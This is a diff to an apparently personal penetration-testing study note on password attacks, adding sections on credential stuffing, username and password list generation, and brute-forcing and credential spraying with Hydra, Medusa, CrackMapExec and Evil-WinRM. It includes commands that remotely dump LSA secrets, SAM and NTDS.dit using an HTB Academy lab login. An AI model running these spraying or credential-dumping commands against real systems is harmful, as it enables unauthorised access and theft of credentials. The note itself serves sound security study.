@@ -3,7 +3,29 @@ tags: [basics, technique, password]
 ---
 
 
-> [!info] See also: [[Certifications/CPTS/Password Attacks|Password Attacks (CPTS — detailed)]] · [[Hydra]] · [[Medusa]] · [[John The Ripper]]
+> [!info] See also: [[Hydra]] · [[Medusa]] · [[John The Ripper]] · [[Hashcat]] · [[Password Cracking]]
+
+
+## Authentication Backgrounds 
+
+![[linux_shadow_file_format.png]]
+![[linux_hash_algorithm_ids.png]]
+
+
+### Windows Authentication Process
+![[windows_auth_process.png]]
+
+
+- [Credentials Processes in Windows Authentication | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication)
+
+![[windows_logon_process.png]]
+
+
+## Credential Stuffing 
+
+![[credential_stuffing.png]]
+
+Use of leaked credentials from breach dumps against unrelated services. Drives the need for password hygiene + MFA.
 
 
 ## Hybrid Attacks 
@@ -23,6 +45,8 @@ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
 
 ## Using username-anarchy to create username list
 
+When attacking an AD, we sometimes have to create some username lists. Manually or using a tool such as [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy):
+
 ```bash
 # Installation
 git clone https://github.com/urbanadventurer/username-anarchy.git
@@ -31,7 +55,7 @@ git clone https://github.com/urbanadventurer/username-anarchy.git
 ./username-anarchy Jane Smith > jane_smith_usernames.txt
 ```
 
-## Using Cupp t ogenerate password lists based on OSINT
+## Using Cupp to generate password lists based on OSINT
 
 ```bash
 # Fill out the cupp information in an interactive manner
@@ -40,6 +64,11 @@ cupp -i
 # Use the generated list and filter based on your requirements using grep
 grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
 ```
+
+## Password Reuse / Default Passwords 
+
+- [ihebski/DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) - Default credentials reference list.
+
 
 ## Using Medusa for Attacks 
 
@@ -99,4 +128,32 @@ hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100
 # RDP
 hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100
 
+```
+
+
+## Network-Based Cracking with NetExec / CrackMapExec
+
+[[NetExec]] (formerly CrackMapExec) lets you spray credentials across SMB/WinRM/RDP/MSSQL/LDAP:
+
+```bash
+crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
+
+# Initial foothold against an AD Controller using a password list
+crackmapexec smb <ip> -u username -p <passwordlist> 
+
+# Dump LSA secrets and SAM remotely
+crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+
+# Capture NTDS.dit remotely once you have DA-equivalent rights
+crackmapexec smb <ip> -u <username> -p <password> --ntds 
+```
+
+
+## Evil-WinRM (post-credential)
+
+Once you have a valid Windows credential and port 5985/5986 is open, [[Evil-Winrm]]:
+
+```bash
+evil-winrm -i <target-IP> -u <username> -p <password>
 ```
